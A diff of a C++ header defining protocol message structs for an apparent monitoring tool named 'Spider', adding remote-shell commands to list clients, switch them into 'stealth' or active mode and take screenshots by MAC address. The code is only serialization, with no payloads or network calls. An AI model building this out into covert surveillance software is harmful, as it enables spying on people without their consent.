@@ -2,8 +2,8 @@
 // Created by doom on 28/09/17.
 //
 
-#ifndef SPIDER_SERVER_MESSAGES_HPP
-#define SPIDER_SERVER_MESSAGES_HPP
+#ifndef SPIDER_PROTO_MESSAGES_HPP
+#define SPIDER_PROTO_MESSAGES_HPP
 
 #include <cstring>
 #include <chrono>
@@ -119,16 +119,15 @@ namespace spi::proto
 
         Hello(const Buffer &buff)
         {
-            auto macAddrBytes = Serializer::unserializeBytes(buff, 0, 6);
-            ::net::MACAddress::RawMACAddress rawAddr;
-            std::copy(macAddrBytes.begin(), macAddrBytes.end(), rawAddr.begin());
-            macAddress.setRaw(rawAddr);
+            macAddress = Serializer::unserializeMACAddress(buff, 0, 6);
+
             version = Serializer::unserializeShort(buff, 6);
 
             auto md5Bytes = Serializer::unserializeBytes(buff, 8, 16);
             utils::MD5::RawMD5 raw;
             std::copy(md5Bytes.begin(), md5Bytes.end(), raw.begin());
             md5.setRaw(raw);
+
             port = Serializer::unserializeShort(buff, 24);
         }
 
@@ -314,6 +313,8 @@ namespace spi::proto
     {
         std::vector<Byte> bytes;
 
+        ImageData() = default;
+
         ImageData(const Buffer &buff)
         {
             bytes = Serializer::unserializeBuff(buff, 0);
@@ -336,27 +337,6 @@ namespace spi::proto
         std::string stringify() const noexcept override
         {
             return "[ImageData] size: " + std::to_string(bytes.size());
-        }
-    };
-
-    struct Screenshot : public ILoggable
-    {
-        static constexpr const size_t SerializedSize = 0;
-
-        void serialize([[maybe_unused]] Buffer &out) const noexcept override
-        {
-        }
-
-        void serializeTypeInfo(Buffer &out) const noexcept override
-        {
-            out.reserve(out.size() + MessageHeaderSize);
-
-            Serializer::serializeInt(out, static_cast<uint32_t>(MessageType::Screenshot));
-        }
-
-        std::string stringify() const noexcept override
-        {
-            return "[Screenshot] requested screenshot";
         }
     };
 
@@ -401,6 +381,176 @@ namespace spi::proto
             return "[ActiveMode] requested switch to active mode";
         }
     };
+
+    struct Screenshot : public ILoggable
+    {
+        static constexpr const size_t SerializedSize = 0;
+
+        void serialize([[maybe_unused]] Buffer &out) const noexcept override
+        {
+        }
+
+        void serializeTypeInfo(Buffer &out) const noexcept override
+        {
+            out.reserve(out.size() + MessageHeaderSize);
+
+            Serializer::serializeInt(out, static_cast<uint32_t>(MessageType::Screenshot));
+        }
+
+        std::string stringify() const noexcept override
+        {
+            return "[Screenshot] requested screenshot";
+        }
+    };
+
+    struct RList : public ILoggable
+    {
+        static constexpr const size_t SerializedSize = 0;
+
+        void serialize([[maybe_unused]] Buffer &out) const noexcept override
+        {
+        }
+
+        void serializeTypeInfo(Buffer &out) const noexcept override
+        {
+            out.reserve(out.size() + MessageHeaderSize);
+
+            Serializer::serializeInt(out, static_cast<uint32_t>(MessageType::RList));
+        }
+
+        std::string stringify() const noexcept override
+        {
+            return "[RList] remote shell requested list of connected clients";
+        }
+    };
+
+    struct RListReply : public ILoggable
+    {
+        std::vector<::net::MACAddress> connectedClients;
+
+        static constexpr const size_t SerializedSize = 4;
+
+        void serialize(Buffer &out) const noexcept override
+        {
+            out.reserve(out.size() + SerializedSize + connectedClients.size() * 6);
+
+            Serializer::serializeInt(out, static_cast<uint32_t>(connectedClients.size()));
+            for (const auto &cur : connectedClients) {
+                Serializer::serializeBytes(out, cur.raw());
+            }
+        }
+
+        void serializeTypeInfo(Buffer &out) const noexcept override
+        {
+            out.reserve(out.size() + MessageHeaderSize);
+
+            Serializer::serializeInt(out, static_cast<uint32_t>(MessageType::RListReply));
+        }
+
+        std::string stringify() const noexcept override
+        {
+            return "[RList] replying with a list of clients";
+        }
+    };
+
+    struct RStealthMode : public ILoggable
+    {
+        ::net::MACAddress addr;
+
+        static constexpr const size_t SerializedSize = 6;
+
+        RStealthMode() = default;
+
+        RStealthMode(const Buffer &buff)
+        {
+            addr = Serializer::unserializeMACAddress(buff, 0, 6);
+        }
+
+        void serialize(Buffer &out) const noexcept override
+        {
+            out.reserve(out.size() + SerializedSize);
+
+            Serializer::serializeBytes(out, addr.raw());
+        }
+
+        void serializeTypeInfo(Buffer &out) const noexcept override
+        {
+            out.reserve(out.size() + MessageHeaderSize);
+
+            Serializer::serializeInt(out, static_cast<uint32_t>(MessageType::RStealthMode));
+        }
+
+        std::string stringify() const noexcept override
+        {
+            return "[RStealthMode] remote shell requested switching to stealth mode";
+        }
+    };
+
+    struct RActiveMode : public ILoggable
+    {
+        ::net::MACAddress addr;
+
+        static constexpr const size_t SerializedSize = 6;
+
+        RActiveMode() = default;
+
+        RActiveMode(const Buffer &buff)
+        {
+            addr = Serializer::unserializeMACAddress(buff, 0, 6);
+        }
+
+        void serialize(Buffer &out) const noexcept override
+        {
+            out.reserve(out.size() + SerializedSize);
+
+            Serializer::serializeBytes(out, addr.raw());
+        }
+
+        void serializeTypeInfo(Buffer &out) const noexcept override
+        {
+            out.reserve(out.size() + MessageHeaderSize);
+
+            Serializer::serializeInt(out, static_cast<uint32_t>(MessageType::RActiveMode));
+        }
+
+        std::string stringify() const noexcept override
+        {
+            return "[RActiveMode] remote shell requested switching to active mode";
+        }
+    };
+
+    struct RScreenshot : public ILoggable
+    {
+        ::net::MACAddress addr;
+
+        static constexpr const size_t SerializedSize = 6;
+
+        RScreenshot() = default;
+
+        RScreenshot(const Buffer &buff)
+        {
+            addr = Serializer::unserializeMACAddress(buff, 0, 6);
+        }
+
+        void serialize(Buffer &out) const noexcept override
+        {
+            out.reserve(out.size() + SerializedSize);
+
+            Serializer::serializeBytes(out, addr.raw());
+        }
+
+        void serializeTypeInfo(Buffer &out) const noexcept override
+        {
+            out.reserve(out.size() + MessageHeaderSize);
+
+            Serializer::serializeInt(out, static_cast<uint32_t>(MessageType::RScreenshot));
+        }
+
+        std::string stringify() const noexcept override
+        {
+            return "[RScreenshot] remote shell requested taking a screenshot";
+        }
+    };
 }
 
-#endif //SPIDER_SERVER_MESSAGES_HPP
+#endif //SPIDER_PROTO_MESSAGES_HPP
